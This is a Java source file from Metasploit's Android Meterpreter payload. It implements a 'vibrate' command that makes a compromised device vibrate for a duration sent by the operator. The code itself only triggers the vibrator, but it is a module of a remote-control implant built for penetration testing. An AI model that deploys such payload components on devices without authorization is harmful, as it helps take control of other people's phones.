package com.metasploit.meterpreter.android;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;

import com.metasploit.meterpreter.AndroidMeterpreter;
import android.os.Vibrator;
import android.content.Context;

public class vibrate implements Command {

    private static final int TLV_EXTENSIONS = 20000;
    private static final int TLV_TYPE_VIBRATE_DURATION = TLVPacket.TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 9021);

    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        float duration = Float.parseFloat(request.getStringValue(TLV_TYPE_VIBRATE_DURATION));
        Vibrator v = (Vibrator)AndroidMeterpreter.getContext().getSystemService(Context.VIBRATOR_SERVICE);

        v.vibrate((int)Math.floor(duration*1000));
        return ERROR_SUCCESS;
    }
}
